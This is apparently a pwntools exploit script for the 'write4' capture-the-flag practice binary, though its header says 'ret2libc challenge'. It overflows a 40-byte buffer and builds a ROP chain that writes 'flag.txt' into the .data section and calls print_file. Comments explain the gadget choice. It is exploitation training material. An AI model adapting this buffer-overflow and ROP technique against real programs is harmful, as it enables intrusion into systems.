# ret2libc challenge

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
break pwnme
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './write4'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# pwntools will get the context arch, bits, os and other useful parameters
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

### The useful gadget for this challenge, moved the value in register r15 to the address of r14 

### mov [r14], r15

### Using readelf: readelf --sections --wide write4, we see that the .data section is writeable, empty and has the size of 10 bytes, which is sufficient for us to write our string "flag.txt"

### We pop the start of .data into r14 and flag.txt into r15.

### Then supply the address of .data with our string to be popped into rdi and used as the functions first argument.

### Offset to RIP, find manually with gdb


string = b'flag.txt'
offset = 40




# Start program
io = start()

pop_rdi = p64(0x400693)

mov = p64(0x400628)
ret = p64(0x4004e6)
popboth = p64(0x400690)
replace = p64(0x601028)

print_file = p64(0x400510)


payload = flat([
      offset*b'A',
      popboth,
      replace,
      string,
      mov,
      pop_rdi,
      replace,
      ret,
      print_file,
      
      
      
    ]
)








io.sendlineafter(b'> ', payload)
io.recvline(10)


# Get Shell?
io.interactive()

